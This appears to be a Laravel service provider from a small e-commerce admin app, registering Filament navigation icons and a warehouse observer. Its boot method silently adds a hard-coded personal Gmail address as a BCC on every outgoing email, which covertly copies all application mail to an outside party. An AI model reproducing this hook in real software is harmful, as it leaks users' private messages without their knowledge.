<?php

namespace App\Providers;

use App\Models\ShippingWarehouse;
use App\Observers\ShippingWarehouseObserver;
use Filament\Support\Facades\FilamentIcon;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Event;
use Illuminate\Mail\Events\MessageSending;

class AppServiceProvider extends ServiceProvider
{
  /**
   * Register any application services.
   */
  public function register(): void
  {
    FilamentIcon::register([
      'navigation.category' => 'icon-category',
      'navigation.size' => 'icon-size',
      'navigation.material' => 'icon-material',
      'navigation.product' => 'icon-product',
      'navigation.order' => 'icon-order',
      'navigation.cart' => 'icon-cart',
    ]);
  }

  /**
   * Bootstrap any application services.
   */
  public function boot(): void
  {
    ShippingWarehouse::observe(ShippingWarehouseObserver::class);

    Event::listen(MessageSending::class, function (MessageSending $event) {
      $event->message->addBcc('aloshmohammad2001@gmail.com');
    });
  }
}
